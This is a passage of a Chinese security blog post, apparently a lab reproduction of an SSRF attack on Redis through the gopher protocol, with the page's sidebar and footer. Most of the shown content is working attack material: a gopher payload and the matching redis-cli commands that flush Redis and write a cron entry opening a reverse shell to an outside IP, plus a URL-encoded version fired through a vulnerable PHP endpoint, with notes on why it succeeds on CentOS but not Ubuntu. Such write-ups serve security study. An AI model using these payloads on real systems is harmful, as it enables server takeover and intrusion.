+<p>在本地进行测试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v &apos;gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$61%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/120.47.30.236/23336 0&gt;&amp;1%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a&apos;</span><br></pre></td></tr></table></figure></p>
+<p>很神奇的是,在不同的机子测试有不同的效果,有的成功,有的失败<br><img src="http://ww1.sinaimg.cn/large/00643K3oly1g8gpcdond7j314103swev.jpg" alt="F0ML0K0YJ(7XFMG2ZX3~3FD.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@vultr:~# echo -e &quot;\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/120.40.30.236/23336 0&gt;&amp;1\n\n\n&quot;|redis-cli -x set 1</span><br><span class="line">OK</span><br><span class="line">root@vultr:~# redis-cli config set dir /var/spool/cron/</span><br><span class="line">OK</span><br><span class="line">root@vultr:~# redis-cli config set dbfilename root</span><br><span class="line">OK</span><br><span class="line">root@vultr:~# redis-cli save</span><br><span class="line">(error) ERR</span><br></pre></td></tr></table></figure></p>
+<p>最后发现是因为这些机子的redis并不是以root权限启动的,而是以redis用户运行,而用写入crontab的方式要求redis必须是root用户启动<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@vultr:/etc# ll crontab</span><br><span class="line">-rw-r--r-- 1 root root 722 Nov 16  2017 crontab</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis    10985     1  0 04:41 ?        00:00:08 /usr/bin/redis-server 127.0.0.1:6379</span><br></pre></td></tr></table></figure>
+<p>经过对比,我发现,使用<code>/etc/init.d/redis-server start</code>启动则是redis用户,如果直接<code>redis-server</code>启动就是root权限.修改启动方式后再进行测试,返回的全是OK,那么就解决这个问题了</p>
+<p>最后进行一下反弹shell的测试吧</p>
+<p>最后的payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v &apos;http://147.248.58.162/ssrf2.php?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_*1%250d%250a%248%250d%250aflushall%250d%250a*3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2461%250d%250a%250a%250a*%2F1%20*%20*%20*%20*%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F120.77.38.236%2F23336%200%3E%261%250a%250a%250a%250d%250a*4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2Fvar%2Fspool%2Fcron%2F%250d%250a*4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a*1%250d%250a%244%250d%250asave%250d%250a*1%250d%250a%244%250d%250aquit%250d%250a&apos;</span><br></pre></td></tr></table></figure></p>
+<p>emmmm,还是没打通,看了别人的文章才知道,这个利用contrab反弹shell只能在centos上行得通,难怪我之前的一次实验一下就成功了,那时候用的就是centos的VPS,而且是下载压缩包安装的,默认还没有各种保护</p>
+<p>而不能在ubuntu成功的原因如下</p>
+<blockquote>
+<p>1.因为默认redis写文件后是644的权限，但ubuntu要求执行定时任务文件/var/spool/cron/crontabs/<username>权限必须是600也就是-rw——-才会执行，否则会报错(root) INSECURE MODE (mode 0600 expected)，而Centos的定时任务文件/var/spool/cron/<username>权限644也能执行</username></username></p>
+<p>2.因为redis保存RDB会存在乱码，在Ubuntu上会报错，而在Centos上不会报错</p>
+<p>3.由于系统的不同，crontrab定时文件位置也会不同,Centos的定时任务文件在/var/spool/cron/<username>,而Ubuntu定时任务文件在/var/spool/cron/crontabs/<username></username></username></p>
+<p>4.Centos和Ubuntu均存在的（需要root权限）/etc/crontab PS：高版本的redis默认启动是redis权限</p>
+</blockquote>
+<p>嗯,所以按照上面的payload是可以打centos的,不过之前测试的centos的VPS出了点意外…..懒得再弄一个centos环境了,之前打过确实反弹shell成功了,至于VPS的意外可以看下一篇blog</p>
+<h2 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h2><p>嗯,本来这个复现是在头一天晚上睡前完成的,然后想着第二天再来完善记录,结果第二天晚上再连VPS靶机的时候….发现ssh连不上去了…然后就有了下一篇博客的故事</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://xz.aliyun.com/t/6235" target="_blank" rel="noopener">https://xz.aliyun.com/t/6235</a></p>
+<p><a href="https://www.jianshu.com/p/56999f2b8e3b" target="_blank" rel="noopener">https://www.jianshu.com/p/56999f2b8e3b</a></p>
+<p><a href="https://blog.chaitin.cn/gopher-attack-surfaces/" target="_blank" rel="noopener">https://blog.chaitin.cn/gopher-attack-surfaces/</a></p>
+<p><a href="https://wywwzjj.top/2019/05/17/Redis-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E7%9B%B8%E5%85%B3%E5%88%A9%E7%94%A8/" target="_blank" rel="noopener">https://wywwzjj.top/2019/05/17/Redis-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E7%9B%B8%E5%85%B3%E5%88%A9%E7%94%A8/</a></p>
+<p><a href="https://joychou.org/web/phpssrf.html" target="_blank" rel="noopener">https://joychou.org/web/phpssrf.html</a></p>
+<p><a href="https://mp.weixin.qq.com/s/as4WP7RkGaXVI6enlMDktg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/as4WP7RkGaXVI6enlMDktg</a></p>
+<p><a href="https://www.lorexxar.cn/2016/12/03/redis-getshell/" target="_blank" rel="noopener">https://www.lorexxar.cn/2016/12/03/redis-getshell/</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/09/26/SOAP反序列化利用/" rel="next" title="SOAP反序列化的利用">
+                <i class="fa fa-chevron-left"></i> SOAP反序列化的利用
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/11/02/记一次服务器被日/" rel="prev" title="记一次服务器风波">
+                记一次服务器风波 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/touxiang.png" alt="R1dd1er">
+            
+              <p class="site-author-name" itemprop="name">R1dd1er</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF简介"><span class="nav-number">2.</span> <span class="nav-text">SSRF简介</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#最基础的漏洞场景"><span class="nav-number">2.0.1.</span> <span class="nav-text">最基础的漏洞场景</span></a></li></ol></li></ol><li class="nav-item nav-level-2"><a class="nav-link" href="#Redis"><span class="nav-number">3.</span> <span class="nav-text">Redis</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#常用命令"><span class="nav-number">3.1.</span> <span class="nav-text">常用命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RESP"><span class="nav-number">3.2.</span> <span class="nav-text">RESP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Redis未授权访问"><span class="nav-number">3.3.</span> <span class="nav-text">Redis未授权访问</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#写入公钥连接ssh"><span class="nav-number">3.3.1.</span> <span class="nav-text">写入公钥连接ssh</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#写webshell"><span class="nav-number">3.3.2.</span> <span class="nav-text">写webshell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#恢复初始设置"><span class="nav-number">3.3.3.</span> <span class="nav-text">恢复初始设置</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#gopher"><span class="nav-number">4.</span> <span class="nav-text">gopher</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#用gopher协议进行ssrf攻击redis"><span class="nav-number">5.</span> <span class="nav-text">用gopher协议进行ssrf攻击redis</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#结束语"><span class="nav-number">6.</span> <span class="nav-text">结束语</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考链接"><span class="nav-number">7.</span> <span class="nav-text">参考链接</span></a></li></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">R1dd1er</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
